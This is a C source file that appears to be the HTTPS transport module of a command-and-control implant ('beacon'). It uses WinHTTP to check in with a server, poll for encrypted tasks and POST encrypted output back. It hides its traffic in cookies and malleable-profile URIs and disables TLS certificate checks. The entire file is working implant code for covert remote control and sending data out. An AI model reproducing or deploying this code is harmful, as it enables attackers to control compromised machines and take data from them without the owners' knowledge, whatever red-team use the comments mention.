// HTTPS transport using WinHTTP.
//
// Implements the three vtable methods:
//   checkin()       – POST metadata to uri_checkin, returns encrypted reply.
//   poll_tasks()    – GET uri_task, returns encrypted task frame (or empty).
//   submit_output() – POST encrypted output frame to uri_post.
//
// All HTTP requests use the malleable profile values baked into g_state:
// host, port, user-agent, metadata_cookie.  Beacon id is carried in the
// Cookie header once a session is established.

#include "../../core/beacon.h"
#include <winhttp.h>

// Base64url helpers (no-padding, for cookie transport of metadata).
static const char b64url[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

static size_t b64url_encode(const uint8_t* src, size_t src_len,
                            char* dst, size_t dst_cap) {
    size_t out = 0;
    for (size_t i = 0; i < src_len; i += 3) {
        uint32_t b = (uint32_t)src[i] << 16;
        if (i+1 < src_len) b |= (uint32_t)src[i+1] << 8;
        if (i+2 < src_len) b |= (uint32_t)src[i+2];
        size_t rem = src_len - i;
        if (out+1 < dst_cap) dst[out++] = b64url[(b>>18)&63];
        if (out+1 < dst_cap) dst[out++] = b64url[(b>>12)&63];
        if (rem > 1 && out+1 < dst_cap) dst[out++] = b64url[(b>>6)&63];
        if (rem > 2 && out+1 < dst_cap) dst[out++] = b64url[ b    &63];
    }
    if (out < dst_cap) dst[out] = '\0';
    return out;
}

// Возвращает 0..63 для допустимых символов base64url, иначе -1.
// Таблица int8_t с нулевой инициализацией не подходит: 0 совпадает со
// значением 'A', поэтому посторонние байты ('{', '"', ':', '}' из
// wrap_prefix/suffix профиля) трактовались бы как 'A' и портили бы
// результат. Функция с явными диапазонами лишена этого изъяна.
static int8_t b64url_val(uint8_t c) {
    if (c >= 'A' && c <= 'Z') return (int8_t)(c - 'A');
    if (c >= 'a' && c <= 'z') return (int8_t)(c - 'a' + 26);
    if (c >= '0' && c <= '9') return (int8_t)(c - '0' + 52);
    if (c == '-') return 62;
    if (c == '_') return 63;
    return -1;
}

static int b64url_decode(const char* src, size_t src_len,
                         uint8_t* dst, size_t dst_cap, size_t* out_len) {
    *out_len = 0;
    size_t i = 0;
    while (i < src_len) {
        uint32_t b = 0; int have = 0;
        while (have < 4 && i < src_len) {
            int8_t v = b64url_val((uint8_t)src[i++]);
            if (v < 0) continue;
            b = (b << 6) | (uint8_t)v;
            have++;
        }
        if (have < 2) break;
        if (*out_len < dst_cap) dst[(*out_len)++] = (uint8_t)(b >> (have==4?16:have==3?10:4));
        if (have >= 3 && *out_len < dst_cap) dst[(*out_len)++] = (uint8_t)((b >> (have==4?8:2)) & 0xFF);
        if (have == 4 && *out_len < dst_cap) dst[(*out_len)++] = (uint8_t)(b & 0xFF);
    }
    return 1;
}

// ---- Session handle cache -------------------------------------------------

static HINTERNET g_session  = NULL;
static HINTERNET g_connect  = NULL;

static HINTERNET get_connect(void) {
    if (g_connect) return g_connect;
    if (!g_session) {
        g_session = WinHttpOpen(
            beacon_state()->user_agent,
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);
        if (!g_session) return NULL;
        // Accept self-signed certs for now (red team deployments often use
        // custom CAs; certificate pinning lives in the malleable profile — v1).
        DWORD opts = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(g_session, WINHTTP_OPTION_SECURITY_FLAGS,
                         &opts, sizeof(opts));
    }
    g_connect = WinHttpConnect(g_session,
                               beacon_state()->host,
                               beacon_state()->port, 0);
    return g_connect;
}

// ---- Generic HTTP send/receive --------------------------------------------

static int http_request(const wchar_t* verb, const wchar_t* uri,
                        const wchar_t* extra_headers,
                        const uint8_t* body, size_t body_len,
                        uint8_t* resp_buf, size_t* resp_len) {
    HINTERNET hc = get_connect();
    if (!hc) return -1;

    HINTERNET req = WinHttpOpenRequest(
        hc, verb, uri, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!req) return -1;

    // Suppress redirect for our fake URIs.
    DWORD redir = WINHTTP_OPTION_REDIRECT_POLICY_NEVER;
    WinHttpSetOption(req, WINHTTP_OPTION_REDIRECT_POLICY, &redir, sizeof(redir));

    // Ignore cert errors (same as session-level flag, belt-and-suspenders).
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    BOOL ok = WinHttpSendRequest(req, extra_headers,
                                 extra_headers ? (DWORD)-1L : 0,
                                 (LPVOID)body, (DWORD)body_len,
                                 (DWORD)body_len, 0);
    if (!ok) {
        bdbg("[beacon] http: WinHttpSendRequest failed\n");
        WinHttpCloseHandle(req); return -1;
    }

    ok = WinHttpReceiveResponse(req, NULL);
    if (!ok) {
        bdbg("[beacon] http: WinHttpReceiveResponse failed\n");
        WinHttpCloseHandle(req); return -1;
    }

    DWORD status = 0; DWORD sz = sizeof(status);
    WinHttpQueryHeaders(req,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        NULL, &status, &sz, NULL);
    if (status != 200) {
        bdbg("[beacon] http: non-200 status\n");
        WinHttpCloseHandle(req); return (int)status;
    }
    size_t total = 0;
    DWORD avail = 0;
    while (WinHttpQueryDataAvailable(req, &avail) && avail > 0) {
        if (total + avail > *resp_len) avail = (DWORD)(*resp_len - total);
        DWORD read = 0;
        WinHttpReadData(req, resp_buf + total, avail, &read);
        total += read;
    }
    *resp_len = total;
    WinHttpCloseHandle(req);
    return 0;
}

// ---- Build Cookie header --------------------------------------------------

static void build_cookie_header(const char* cookie_name,
                                 const char* value,
                                 wchar_t* out, size_t out_chars) {
    // "Cookie: <name>=<value>\r\n"
    // Simple wide-string assembly without swprintf (no CRT).
    size_t i = 0;
    const wchar_t prefix[] = L"Cookie: ";
    for (size_t j = 0; prefix[j] && i+1 < out_chars; ++j) out[i++] = prefix[j];
    for (size_t j = 0; cookie_name[j] && i+1 < out_chars; ++j)
        out[i++] = (wchar_t)(uint8_t)cookie_name[j];
    if (i+1 < out_chars) out[i++] = L'=';
    for (size_t j = 0; value[j] && i+1 < out_chars; ++j)
        out[i++] = (wchar_t)(uint8_t)value[j];
    const wchar_t suffix[] = L"\r\n";
    for (size_t j = 0; suffix[j] && i+1 < out_chars; ++j) out[i++] = suffix[j];
    out[i] = 0;
}

// ---- Vtable implementations -----------------------------------------------

static int https_checkin(const uint8_t* frame, size_t frame_len,
                         uint8_t* out_frame, size_t* out_frame_len) {
    // Encode frame as base64url and ship it in the metadata cookie.
    char enc[8192];
    size_t enc_len = b64url_encode(frame, frame_len, enc, sizeof(enc));
    (void)enc_len;

    // Build Cookie header. Must hold "Cookie: <name>=<b64url(frame)>\r\n".
    // Frame with RSA-wrapped session key is ~374 bytes → ~499 base64url chars;
    // 1024 wchar_t gives enough headroom for any realistic cookie name.
    wchar_t cookie_hdr[1024];
    const wchar_t* cname = beacon_state()->metadata_cookie;
    char cname_c[64] = {0};
    for (int i = 0; cname[i] && i < 63; ++i) cname_c[i] = (char)cname[i];
    build_cookie_header(cname_c, enc, cookie_hdr, 1024);

    // Server returns base64url-encoded encrypted reply in body (same convention
    // as task poll, via respond_wrapped). Receive into a scratch buffer first.
    uint8_t raw[8192];
    size_t raw_len = sizeof(raw);
    int rc = http_request(L"GET", beacon_state()->uri_checkin,
                          cookie_hdr, NULL, 0,
                          raw, &raw_len);
    if (rc != 0 || raw_len == 0) {
        *out_frame_len = 0;
        return rc;
    }

    // b64url_decode ignores all non-alphabet bytes (tbl entry == -1 → continue),
    // so passing the raw body handles both bare base64url and HTML-wrapped profiles.
    size_t decoded_len = 0;
    b64url_decode((const char*)raw, raw_len,
                  out_frame, *out_frame_len, &decoded_len);
    *out_frame_len = decoded_len;
    return 0;
}

static int https_poll_tasks(uint8_t* out_frame, size_t* out_frame_len) {
    BeaconState* st = beacon_state();

    // Cookie: <sid>=<beacon_id>
    wchar_t cookie_hdr[256];
    char cname_c[64] = {0};
    for (int i = 0; st->metadata_cookie[i] && i < 63; ++i)
        cname_c[i] = (char)st->metadata_cookie[i];
    build_cookie_header(cname_c, st->beacon_id, cookie_hdr, 256);

    uint8_t* raw = (uint8_t*)bmalloc(3 * 1024 * 1024);
    if (!raw) { *out_frame_len = 0; return -1; }
    size_t raw_len = 3 * 1024 * 1024;
    int rc = http_request(L"GET", st->uri_task,
                          cookie_hdr, NULL, 0,
                          raw, &raw_len);
    if (rc != 0 || raw_len == 0) {
        bfree(raw);
        *out_frame_len = 0;
        return rc;
    }

    // Server returns base64url-encoded encrypted frame.
    size_t decoded_len = 0;
    b64url_decode((const char*)raw, raw_len,
                  out_frame, *out_frame_len, &decoded_len);
    bfree(raw);
    *out_frame_len = decoded_len;
    return 0;
}

static int https_submit_output(const uint8_t* frame, size_t frame_len) {
    BeaconState* st = beacon_state();

    // Cookie header for auth
    wchar_t cookie_hdr[256];
    char cname_c[64] = {0};
    for (int i = 0; st->metadata_cookie[i] && i < 63; ++i)
        cname_c[i] = (char)st->metadata_cookie[i];
    build_cookie_header(cname_c, st->beacon_id, cookie_hdr, 256);

    // POST raw frame bytes as body; server expects binary.
    uint8_t resp[256]; size_t rlen = sizeof(resp);
    return http_request(L"POST", st->uri_post,
                        cookie_hdr,
                        frame, frame_len,
                        resp, &rlen);
}

static int https_connection_lost(void) { return 0; } // stateless

const TransportVtbl g_transport_https = {
    .checkin         = https_checkin,
    .poll_tasks      = https_poll_tasks,
    .submit_output   = https_submit_output,
    .connection_lost = https_connection_lost,
};
